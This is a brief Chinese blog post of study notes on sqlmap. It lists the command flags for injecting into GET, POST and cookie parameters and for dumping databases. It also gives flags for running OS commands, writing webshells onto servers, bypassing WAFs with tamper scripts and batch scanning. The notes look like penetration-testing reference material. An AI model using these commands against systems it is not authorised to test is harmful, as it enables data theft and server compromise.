SQLMap笔记

2019-03-16
  • Web安全
本文总阅读量次

sqlmap -u “url”
get注入：-u “url”
post注入： –data “数据”
cookie注入: –cookie “cookie值”

获取数据库名：–current-db
获取当前用户：–current–user

获取数据量：–count -D 库名
查看用户权限：–privileges
MySQL:root
MSSQL:sa

注入MySQL
1.获取库名：–current-db
2.获取表名：–tables -D 库名
3.获取列名：–columns -T 表名 -D 库名
4.获取内容：–dump -C 列名 -T 表名 -D 库名

其它数据库流程相同
NoSQLMap(github) 注入Mangodb、NoSQL

sqlmap连接数据库sqlmap.py -d “mysql:用户名:密码@地址:端口/数据库名”
前提：安装pymysql github下载
进入命令行：–sql-shell

延时注入：–delay 时间
延时注入：–safe-freq

需要网站绝对路径 、最高权限
命令执行(提权)：–os-cmd=”命令” 4-2
写webshell：–os-shell 4-2
本地写入webshell：–file-write “本地文件路径” –file-dest “目标文件路径”

绕waf：–tamper=”脚本名字”

批量检测：-m “文件路径”
结合BurpSuite批量检测：-l “burp.log” –batch -smart
batch：会自动选择yes
smart：启发式快速判断，节约时间

注入级别：
–level=（1-5）#水平等级，默认为1
–risk=（0-3）#风险等级，默认为0

检测防火墙特征：–identity-waf

学习注入payload：
1.xml目录
2.-v参数，默认为1，3显示注入的payload
3.–proxy=http://ip:port 结合BurpSuite代理抓包
